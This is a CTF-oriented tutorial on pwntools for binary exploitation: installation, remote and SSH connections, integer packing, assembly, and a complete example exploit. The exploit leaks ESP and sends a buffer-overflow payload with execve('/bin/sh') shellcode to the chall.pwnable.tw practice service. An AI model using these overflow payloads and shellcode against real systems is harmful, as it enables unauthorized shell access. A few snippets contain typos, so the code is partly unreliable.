# Binary Exploitation

## [Pwntools](https://github.com/Gallopsled/pwntools)
A grab-bag of tools to make writing exploits for CTFs easy!

### Install
```
apt-get update
apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential
pip install --upgrade pip
pip install --upgrade pwntools
```

### Usage
Include in file:
```python
from pwn import *
``` 

#### [Making Connections](http://docs.pwntools.com/en/stable/tubes.html#module-pwnlib.tubes)
How to connect to sockets and over ssh:
##### [Netcat](http://docs.pwntools.com/en/stable/tubes/sockets.html#module-pwnlib.tubes.remote)
```python
connection = remote(host, port)

# Example:
r = remote('pwn.hsctf.com', 1234)
# Same as 'nc pwn.hsctf.com 1234'
```

##### [SSH](http://docs.pwntools.com/en/stable/tubes/ssh.html#module-pwnlib.tubes.ssh)
```python
session = ssh(username, host, password=passwd)

# Example:
s = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0')
# Same as 'ssh bandit@bandit.labs.overthewire.org'
```


#### [Interacting with Processes](http://docs.pwntools.com/en/stable/tubes/processes.html#module-pwnlib.tubes.process)
Now that we've connected to the host, how do we interact with it?
#### Interacting with a remote
```python
r = remote('12.123.45.324', 666) # Connect
r.recvline()			 # Receive next line from remote
r.send("test\r\n")               # Send to remote
r.interactive()                  # Manually interact with remote
...
r.close()			 # Close connection
```

#### Interacting with a process
```python
# Connect over ssh to host
s = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0')

sh = s.process('/bin/sh')	  # Run shell
# or s.run('sh')

sh.sendline('echo Hello, world!') # Send to shell, appends newline
sh.recvline(timeout=5)	          # Receive line to shell, returns after nothing received for 5 seconds
sh.interactive()		  # Manually interact with shell
...
s.close()                         # Close ssh connection
```


#### [Setting Target Architecture and OS](http://docs.pwntools.com/en/stable/intro.html#setting-the-target-architecture-and-os)
You can set the global context so that other functions (such as p32 and asm) default to the correct endianess and architecture:
```python
context.arch      = 'i386'
context.os        = 'linux'
context.endian    = 'little'
context.word_size = 32
contex.log_level = 'debug' # More verbose output, very useful

# or

context(arch='arm', os='linux', endian='big', word_size=32, log_level='debug')
```


#### [Packing Integers](http://docs.pwntools.com/en/stable/util/packing.html#module-pwnlib.util.packing)
How to convert between integers as Python sees them and their representation as a sequence of bytes:
```python
# What you will use most often
win = p32(0xdeadbeef) # Packs 32-bit int, endianness and sign based on *context*
# Same as '\xef\xbe\xad\xde' on x86 or arm (little endian)

# Can use other bit sizes and specify endianess and sign
p8(0x54, endian='little', sign='signed'
p16(0x541A, endian='big', sign='signed')
p64(0x541A2B4E28BD541C, endian='big', sign='unsigned')

# Example:
buf = 'A'*20
win = p32(0xdeadbeef) 
payload = buf + win

r.sendline(payload)
r.interactive()
```


#### [Assembly and Disassembly](http://docs.pwntools.com/en/stable/asm.html#module-pwnlib.asm)
Converting from assembly instructions to byte representations and back:
```python
asm('mov eax, 0').encodde('hex') # 'b800000000'

disasm('6a0258cd80ebf9'.decode('hex'))
#   0:   6a 02                   push   0x2
#   2:   58                      pop    eax
#   3:   cd 80                   int    0x80
#   5:   eb f9                   jmp    0x0

# Example: 
shellcode = asm('\n'.join([   # Shell code that will run /bin/sh when executed
    'push %d' % u32('/sh\0'),
    'push %d' % u32('/bin'),
    'xor edx, edx',
    'xor ecx, ecx',
    'mov ebx, esp',
    'mov eax, 0xb',
    'int 0x80']))

payload = "A"*20  + p32(esp + 20) + shellcode 
r.send(payload)
r.interactive()
```

##### [Shellcode generation - You don't need to write your own shellcode!](http://docs.pwntools.com/en/stable/shellcraft.html#module-pwnlib.shellcraft)


### Example Program
```python
from pwn import *

def leak_esp(r):
	address_1 = p32(0x08048087)             # mov ecx, esp; mov dl, 0x14; mov bl, 1; mov al, 4; int 0x80; 
	payload = 'A'*20 + address_1
	print r.recvuntil('CTF:')
	r.send(payload)
	esp = u32(r.recv()[:4])
	print "Address of ESP: ", hex(esp)
	return esp

shellcode = asm('\n'.join([
    'push %d' % u32('/sh\0'),
    'push %d' % u32('/bin'),
    'xor edx, edx',
    'xor ecx, ecx',
    'mov ebx, esp',
    'mov eax, 0xb',
    'int 0x80',
]))

if __name__ == "__main__":
    context.arch = 'i386'
    r = remote('chall.pwnable.tw', 10000)
    #gdb.attach(r)
    esp = leak_esp(r)
    payload = "A"*20  + p32(esp + 20) + shellcode 
    r.send(payload)
    r.interactive()
```

### [Other Example Programs](https://github.com/Gallopsled/pwntools-write-ups)
